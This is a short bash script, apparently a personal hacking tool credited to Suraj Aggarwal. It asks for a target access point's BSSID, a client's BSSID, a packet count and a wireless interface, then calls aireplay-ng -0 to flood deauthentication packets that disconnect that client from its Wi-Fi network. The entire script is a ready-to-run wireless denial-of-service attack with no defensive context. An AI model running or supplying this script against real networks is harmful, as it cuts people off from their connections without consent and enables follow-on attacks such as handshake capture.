echo ""
echo "================================"
echo "  Wifi De-Authetication System  "
echo "================================"
echo "       By Suraj Aggarwal        "
echo "================================"
echo ""
read -p "Enter target BSSID> " bssid
read -p "Enter number authentication packets to send> " packet
read -p "Enter user BSSID> " user
read -p "Enter interface> " int
echo "Starting De-Authentication"
sleep 2
aireplay-ng -0 $packet -a $bssid -c $user $int
echo "Done Sending Packets..."
echo ""
